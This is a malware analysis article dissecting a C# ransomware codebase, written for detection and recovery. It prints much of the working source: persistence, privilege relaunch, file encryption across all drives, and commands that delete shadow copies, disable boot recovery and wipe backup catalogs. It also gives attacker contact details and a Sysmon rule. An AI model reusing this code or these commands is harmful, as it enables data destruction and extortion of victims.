# Comprehensive Technical Analysis of a C# Ransomware Codebase

## Introduction
This article provides a detailed technical analysis of a C# ransomware codebase, comprising three key components: the `ServerConnection` class (handling system identification, persistence, and key generation), the `Encryption` class (implementing file encryption and system sabotage), and the `config` class (defining attacker details and ransom note content). The code is malicious, designed to encrypt files, disable recovery options, and demand a ransom. This analysis is intended for cybersecurity researchers, incident responders, or defenders to understand ransomware behavior, detect it, or mitigate its impact. **Do not execute or modify this code, as it could cause significant harm.**

The ransomware employs a sophisticated mix of ISAAC-based file encryption, AES-RSA hybrid encryption, system sabotage, and persistent ransom note delivery. However, a critical flaw—local storage of the RSA private key—undermines its effectiveness. Below, we dissect each component, illustrate their purposes with code snippets, highlight flaws, and provide defensive strategies.

---

## 1. `ServerConnection` Class
The `ServerConnection` class handles system identification, persistence, privilege escalation, and RSA key generation, forming the foundational setup for the ransomware’s operation.

### 1.1 `GetID` Method
**Purpose**: Generates a unique identifier for the infected system to track victims.

**Code**:
```csharp
public static string GetID()
{
    ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"C:\"");
    val.Get();
    if (!string.IsNullOrEmpty(((ManagementBaseObject)val)["VolumeSerialNumber"].ToString()))
    {
        return ((ManagementBaseObject)val)["VolumeSerialNumber"].ToString();
    }
    string text = string.Empty;
    ManagementObjectEnumerator enumerator = new ManagementClass("Win32_Processor").GetInstances().GetEnumerator();
    try
    {
        while (enumerator.MoveNext())
        {
            ManagementObject val2 = (ManagementObject)enumerator.Current;
            if (text == string.Empty)
            {
                text = ((ManagementBaseObject)val2).Properties["ProcessorId"].Value.ToString();
            }
        }
        return text;
    }
    finally
    {
        ((IDisposable)enumerator)?.Dispose();
    }
}
```

**Analysis**:
- Queries Windows Management Instrumentation (WMI) to retrieve the C: drive’s volume serial number (`Win32_LogicalDisk`). If unavailable, it falls back to the processor ID (`Win32_Processor`).
- **Flaws**: Assumes C: drive accessibility; lacks error handling; processor IDs may not be unique.
- **Malicious Impact**: Embeds the ID in ransom notes and file extensions (e.g., `.jett`) to track victims.

### 1.2 `StartUPAdd` Method
**Purpose**: Ensures persistence by adding a malicious HTML Application (HTA) file to the Startup folder.

**Code**:
```csharp
public static void StartUPAdd()
{
    try
    {
        File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\info.hta", 
            Resources.info.Replace("_email2_", config.Email_2)
                         .Replace("_email1_", config.Email_1)
                         .Replace("_id_", GetID()));
    }
    catch
    {
    }
}
```

**Analysis**:
- Writes `info.hta` to the Startup folder, embedding attacker emails and victim ID.
- **Flaw**: Silent error handling may fail if the folder is write-protected.
- **Malicious Impact**: Runs at login, displaying a ransom note or executing malicious scripts.

### 1.3 `RequireAdministratorAccess` Method
**Purpose**: Ensures administrative privileges for maximum system access.

**Code**:
```csharp
public static void RequireAdministratorAccess()
{
    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
    {
        try
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo
            {
                Verb = "runas",
                UseShellExecute = true,
                FileName = Assembly.GetExecutingAssembly().Location
            };
            process.Start();
            Environment.Exit(0);
        }
        catch
        {
        }
    }
}
```

**Analysis**:
- Relaunches with `runas` if not admin, triggering a UAC prompt.
- **Flaw**: Exits on failure without fallback, limiting impact if elevation is denied.
- **Malicious Impact**: Enables access to critical files and system settings.

### 1.4 `GenerateAndSaveRSAKeys` Method
**Purpose**: Generates RSA key pairs for encryption.

**Code**:
```csharp
public static void GenerateAndSaveRSAKeys()
{
    using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(4096);
    try
    {
        string contents = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
        File.WriteAllText("public_key.xml", contents);
        string contents2 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true);
        File.WriteAllText("private_key.xml", contents2);
    }
    finally
    {
        rSACryptoServiceProvider.PersistKeyInCsp = false;
    }
}
```

**Analysis**:
- Creates 4096-bit RSA keys, saving the public key to `public_key.xml` and private key to `private_key.xml`.
- **Critical Flaw**: Local storage of `private_key.xml` allows victims to decrypt files without payment.
- **Malicious Impact**: Prepares for file encryption, but the flaw undermines the ransom demand.

**Defensive Strategies**:
- **Detection**: Monitor WMI queries, `.hta` file creation, `runas` attempts, and `.xml` key files.
- **Recovery**: Use `private_key.xml` to decrypt files.

---

## 2. `Encryption` Class
The `Encryption` class implements file encryption, system sabotage, and persistence, executing the core malicious payload.

### 2.1 `Crypt.ISAAC` Class
**Purpose**: Implements the ISAAC CSPRNG for XOR-based file encryption.

**Code**:
```csharp
public class ISAAC
{
    public const int SIZE = 512;
    public const int MASK = 2044;
    public int count;
    public int[] rsl;
    public int[] mem;
    private int a, b, c;

    public ISAAC() { mem = new int[512]; rsl = new int[512]; Init(flag: false); }
    public void Isaac() { /* Bitwise operations to generate 512 random integers */ }
    public void Init(bool flag) { /* Initializes state with mixing */ }
    public int val() { /* Returns random integer, refreshing state */ }
}
```

**Analysis**:
- Generates a keystream for XOR encryption.
- **Flaw**: Non-standard `MASK = 2044` may weaken randomness.
- **Malicious Impact**: Encrypts files, making them inaccessible without the key.

### 2.2 `Crypt.PrepareKey` Method
**Purpose**: Initializes ISAAC with a password-derived key.

**Code**:
```csharp
public static ISAAC PrepareKey()
{
    try
    {
        string machineName = Environment.MachineName;
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        ISAAC iSAAC = new ISAAC();
        for (int i = 0; i < 3; i++) { iSAAC.Isaac(); }
        for (int j = 0; j < 512; j++) { iSAAC.mem[j] = bytes[j]; }
        // Overwrites machineName and bytes for memory clearing
        for (int m = 0; m < 3; m++) { iSAAC.Isaac(); }
        return iSAAC;
    }
    catch { return null; }
}
```

**Analysis**:
- Seeds ISAAC with a password and machine name.
- **Flaw**: Short passwords leave uninitialized memory; returning `null` on error could crash encryption.
- **Malicious Impact**: Ties encryption to a system-specific key.

### 2.3 `Crypt.CryptFile` Method
**Purpose**: Encrypts files using ISAAC.

**Code**:
```csharp
public static void CryptFile(ISAAC csprng, byte[] subkey, string loc)
{
    FileStream fileStream = null;
    try
    {
        fileStream = File.Open(loc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
        byte[] array2 = new byte[819200];
        int num = fileStream.Read(array2, 0, 819200);
        do
        {
            csprng.Isaac();
            for (int k = 0; k < num; k++)
            {
                array2[k] = (byte)(array2[k] ^ csprng.rsl[k % 512]);
            }
            fileStream.Seek(-num, SeekOrigin.Current);
            fileStream.Write(array2, 0, num);
        }
        while ((num = fileStream.Read(array2, 0, 819200)) > 0);
    }
    catch (UnauthorizedAccessException) { }
    finally { if (fileStream != null) { fileStream.Close(); fileStream.Dispose(); } }
}
```

**Analysis**:
- XORs file contents with ISAAC keystream in 819200-byte chunks.
- **Flaw**: Silent error handling may skip files; fixed buffer size may cause issues.
- **Malicious Impact**: Renders files inaccessible.

### 2.4 `EncryptLongString` Method
**Purpose**: Encrypts the ISAAC password with AES-RSA.

**Code**:
```csharp
public static string EncryptLongString(string textToEncrypt, string publicKeyString)
{
    try
    {
        using Aes aes = Aes.Create();
        aes.KeySize = 256;
        aes.GenerateKey();
        aes.GenerateIV();
        byte[] array;
        using (MemoryStream memoryStream = new MemoryStream())
        {
            using (ICryptoTransform transform = aes.CreateEncryptor())
            {
                using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
                using StreamWriter streamWriter = new StreamWriter(stream);
                streamWriter.Write(textToEncrypt);
            }
            array = memoryStream.ToArray();
        }
        using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(4096);
        rSACryptoServiceProvider.FromXmlString(publicKeyString);
        byte[] array2 = rSACryptoServiceProvider.Encrypt(aes.Key, fOAEP: true);
        byte[] array3 = new byte[4 + array2.Length + 16 + array.Length];
        BitConverter.GetBytes(array2.Length).CopyTo(array3, 0);
        array2.CopyTo(array3, 4);
        aes.IV.CopyTo(array3, 4 + array2.Length);
        array.CopyTo(array3, 4 + array2.Length + 16);
        return Convert.ToBase64String(array3);
    }
    catch (Exception ex) { throw new Exception("خطا در رمزنگاری: " + ex.Message); }
}
```

**Analysis**:
- Encrypts the password with AES, then encrypts the AES key with RSA.
- **Flaw**: Persian error message may reveal attacker’s locale.
- **Malicious Impact**: Stores encrypted password in `Key.bin`, intended for attacker retrieval.

### 2.5 `Encrypt` Method
**Purpose**: Encrypts files, adds ransom notes, and renames files.

**Code**:
```csharp
internal static void Encrypt(string name)
{
    try
    {
        if (Path.GetExtension(name) == ".jett") return;
        if (new[] { "private_key.xml", "Key.bin", "info.hta" }.Contains(Path.GetFileName(name))) return;
        string path = Path.Combine(Path.GetDirectoryName(name), "ReadMe.txt");
        if (!File.Exists(path))
        {
            File.WriteAllText(path, config.Readme_Text.Replace("_pcid_", config.GetID()).Replace("_em1_", config.Email_1).Replace("_em2_", config.Email_2));
        }
        Crypt.PrepareKey();
        Crypt.CryptFile(new Crypt.ISAAC(), KeyEncrypt(Crypt.password), name);
        File.Move(name, name + ".[" + ServerConnection.GetID() + "][" + config.Email_1 + "].jett");
    }
    catch (Exception ex) { LogError(ex.Message); }
}
```

**Analysis**:
- Skips specific files, creates ransom notes, encrypts files, and adds `.jett` extension.
- **Flaw**: Excludes `private_key.xml`, enabling decryption if present.
- **Malicious Impact**: Locks files and delivers ransom instructions.

### 2.6 `StartEncryption` Method
**Purpose**: Encrypts all drives in parallel.

**Code**:
```csharp
public static void StartEncryption()
{
    try
    {
        ParallelOptions parallelOptions = new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount };
        List<DriveInfo> list = DriveInfo.GetDrives().Where(x => x.IsReady).ToList();
        List<Thread> list2 = new List<Thread>();
        foreach (DriveInfo drive in list)
        {
            Thread thread = new Thread((ThreadStart)delegate
            {
                Parallel.ForEach(Directory.GetFiles(drive.Name, "*.*", SearchOption.TopDirectoryOnly), parallelOptions, Encrypt);
                Parallel.ForEach(Directory.GetDirectories(drive.Name).Where(NecessaryToEncrypt).ToList(), parallelOptions, SearchDirectory);
            });
            list2.Add(thread);
            thread.Start();
        }
        foreach (Thread item in list2) { item.Join(); }
    }
    catch { }
}
```

**Analysis**:
- Encrypts files across drives using multiple threads.
- **Flaw**: Silent errors may skip files or drives.
- **Malicious Impact**: Maximizes encryption speed and impact.

### 2.7 System Sabotage Methods
**Purpose**: Disables recovery and monitoring.

**Code**:
```csharp
private static void deleteShadowCopies() { runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete"); }
private static void disableRecoveryMode() { runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no"); }
private static void deleteBackupCatalog() { runCommand("wbadmin delete catalog -quiet"); }
public static void DisableTaskManager() { /* Sets registry to disable Task Manager */ }
private static void stopBackupServices() { /* Stops 42 backup/security services */ }
```

**Analysis**:
- Deletes shadow copies, disables recovery, removes backups, disables Task Manager, and stops services.
- **Flaw**: Silent errors may leave recovery options intact.
- **Malicious Impact**: Prevents data restoration and detection.

### 2.8 `Main` Method
**Purpose**: Orchestrates the attack.

**Code**:
```csharp
private static void Main(string[] args)
{
    try
    {
        ServerConnection.RequireAdministratorAccess();
        DisableTaskManager();
        deleteShadowCopies();
        disableRecoveryMode();
        deleteBackupCatalog();
        stopBackupServices();
        if (!File.Exists("public_key.xml")) { ServerConnection.GenerateAndSaveRSAKeys(); }
        Crypt.password = UltraSecureKeyGenerator.CreatePassword(4094);
        Crypt.passwordRsa = EncryptLongString(Crypt.password, rsaKey());
        File.WriteAllText("C:Key.bin", Crypt.passwordRsa);
        File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Key.bin"), Crypt.passwordRsa);
        ServerConnection.StartUPAdd();
        StartEncryption();
        string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "info.hta");
        for (int i = 0; i < 3; i++) { Process.Start(fileName); Thread.Sleep(500); }
    }
    catch { }
}
```

**Analysis**:
- Initializes the attack, generates keys, encrypts the password, ensures persistence, and launches encryption and ransom notes.
- **Critical Flaw**: `private_key.xml` enables decryption of `Key.bin`.
- **Malicious Impact**: Executes a full ransomware attack.

**Defensive Strategies**:
- **Detection**: Monitor `.jett` files, `Key.bin`, `info.hta`, command executions, and registry changes.
- **Recovery**: Decrypt `Key.bin` with `private_key.xml` to recover the ISAAC password.

---

## 3. `config` Class
The `config` class defines attacker details, ransom note content, and victim identification.

### 3.1 `Soldier` Field
**Purpose**: Identifies the attacker or campaign.

**Code**:
```csharp
public static readonly string Soldier = "mehrdad";
```

**Analysis**:
- Likely a codename for the attacker.
- **Flaw**: Hardcoding aids attribution.
- **Malicious Impact**: Tracks the campaign.

### 3.2 `Email_1` and `Email_2` Fields
**Purpose**: Provides attacker contact emails.

**Code**:
```csharp
public static readonly string Email_1 = "info@cloudminerapp.com";
public static readonly string Email_2 = "3998181090@qq.com";
```

**Analysis**:
- Used in ransom notes and file extensions.
- **Flaw**: Static emails are easily blocked.
- **Malicious Impact**: Facilitates ransom negotiations.

### 3.3 `Readme_Text` Field
**Purpose**: Defines the ransom note.

**Code**:
```csharp
public static readonly string Readme_Text = "\r\n               ALL YOUR VALUABLE DATA WAS ENCRYPTED!\r\n\r\nAll yоur filеs wеrе еnсrуptеd with strоng crуptо аlgоrithm АЕS-256 + RSА-2048.\r\n...\r\nfaster support Write Us To The ID-Telegram :@decrypt30  (https://t.me/decrypt30  )\r\n_em1_\r\n_em2_\r\nIn subjеct linе writе уоur ID: _pcid_\r\n...";
```

**Analysis**:
- Instructs victims to contact attackers via email or Telegram (`@decrypt30`).
- **Flaw**: Hardcoded Telegram handle is trackable.
- **Malicious Impact**: Pressures victims to pay.

### 3.4 `Hide` Field
**Purpose**: Controls stealth behavior.

**Code**:
```csharp
public static readonly int Hide = 0;
```

**Analysis**:
- Likely a visibility flag.
- **Flaw**: Static value simplifies detection.
- **Malicious Impact**: May hide ransomware activity.

### 3.5 `GetID` Method
**Purpose**: Generates a system identifier.

**Code**:
```csharp
public static string GetID()
{
    ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"C:\"");
    val.Get();
    if (!string.IsNullOrEmpty(((ManagementBaseObject)val)["VolumeSerialNumber"].ToString()))
    {
        return ((ManagementBaseObject)val)["VolumeSerialNumber"].ToString();
    }
    // Fallback to processor ID
}
```

**Analysis**:
- Mirrors `ServerConnection.GetID`, using WMI for identification.
- **Flaw**: WMI dependency is fragile.
- **Malicious Impact**: Tracks victims.

**Defensive Strategies**:
- **Detection**: Monitor `ReadMe.txt`, `info.hta`, `@decrypt30`, and WMI queries.
- **Prevention**: Block emails and Telegram URLs; restrict WMI.
- **Mitigation**: Report attacker infrastructure; use backups.

---

## Overall Malicious Workflow
1. **Initialization**: `Main` ensures admin privileges, disables Task Manager, and removes recovery options.
2. **Setup**: Generates RSA keys, storing `private_key.xml` locally; creates and encrypts an ISAAC password, saving it as `Key.bin`.
3. **Persistence**: Adds `info.hta` to Startup and launches it to display the ransom note from `config.Readme_Text`.
4. **Encryption**: Encrypts files across drives using ISAAC, adds `.jett` extensions, and deploys ransom notes with attacker emails and Telegram handle.
5. **Sabotage**: Deletes shadow copies, disables recovery, and stops backup services.
6. **Outcome**: Files are encrypted, recovery is blocked, and victims are directed to contact the attacker.

**Critical Flaw**: Local `private_key.xml` storage allows decryption of `Key.bin`, recovering the ISAAC password and enabling file decryption without payment.

---

## Defensive Strategies
### Detection
- **Sysmon Rule Example**:
  ```xml
  <RuleGroup name="Ransomware" groupRelation="or">
    <FileCreate onmatch="include">
      <TargetFilename condition="end with">.jett</TargetFilename>
      <TargetFilename condition="end with">Key.bin</TargetFilename>
      <TargetFilename condition="end with">ReadMe.txt</TargetFilename>
      <TargetFilename condition="end with">info.hta</TargetFilename>
      <TargetFilename condition="end with">public_key.xml</TargetFilename>
      <TargetFilename condition="end with">private_key.xml</TargetFilename>
    </FileCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">cmd.exe</Image>
      <CommandLine condition="contains">vssadmin</CommandLine>
      <CommandLine condition="contains">bcdedit</CommandLine>
      <CommandLine condition="contains">wbadmin</CommandLine>
      <CommandLine condition="contains">runas</CommandLine>
    </ProcessCreate>
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">DisableTaskMgr</TargetObject>
    </RegistryEvent>
    <WmiEvent onmatch="include">
      <Operation condition="contains">Win32_LogicalDisk</Operation>
      <Operation condition="contains">Win32_Processor</Operation>
    </WmiEvent>
  </RuleGroup>
  ```
- Monitor file renames, command executions, registry changes, WMI queries, and strings like `@decrypt30`, `info@cloudminerapp.com`, `3998181090@qq.com`, and `mehrdad`.

### Prevention
- Disable HTA execution via Group Policy: `Computer Configuration > Policies > Administrative Templates > Windows Components > Internet Explorer > Turn off HTML Application`.
- Block `info@cloudminerapp.com`, `3998181090@qq.com`, and `t.me/decrypt30` at network/email gateways.
- Restrict WMI, `cmd.exe`, and service modifications.
- Configure UAC to `Always notify` and use standard user accounts.
- Deploy EDR to block suspicious file and process activity.

### Mitigation
- **Recovery**: Use `private_key.xml` to decrypt `Key.bin`, recovering the ISAAC password. Example:
  ```csharp
  using System.Security.Cryptography;
  using System.IO;

  public static string DecryptKeyBin(string keyBinPath, string privateKeyPath)
  {
      byte[] encryptedData = Convert.FromBase64String(File.ReadAllText(keyBinPath));
      int keyLength = BitConverter.ToInt32(encryptedData, 0);
      byte[] rsaEncryptedKey = new byte[keyLength];
      Array.Copy(encryptedData, 4, rsaEncryptedKey, 0, keyLength);
      using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(4096))
      {
          rsa.FromXmlString(File.ReadAllText(privateKeyPath));
          byte[] aesKey = rsa.Decrypt(rsaEncryptedKey, true);
          // Further AES decryption logic to recover password
          return "RecoveredPassword"; // Placeholder
      }
  }
  ```
- Restore from offline backups.
- Report attacker infrastructure (`@decrypt30`, emails, `cloudminerapp.com`) to service providers.
- Engage incident response professionals for active infections.

---

## Conclusion
This ransomware combines sophisticated techniques—ISAAC encryption, AES-RSA hybrid encryption, system sabotage, and persistent ransom notes—but is critically flawed by storing `private_key.xml` locally. The `ServerConnection`, `Encryption`, and `config` classes work together to identify systems, encrypt files, disable recovery, and demand payment. Defenders can exploit the private key flaw, monitor signatures (e.g., `.jett`, `Key.bin`, `@decrypt30`), and block attacker infrastructure to mitigate its impact.

For further analysis or incident response, consult cybersecurity experts. If facing an active infection, contact law enforcement or professionals immediately.

**Disclaimer**: This analysis is for educational and defensive purposes only. Do not use this code for malicious purposes, as it is illegal and harmful.

---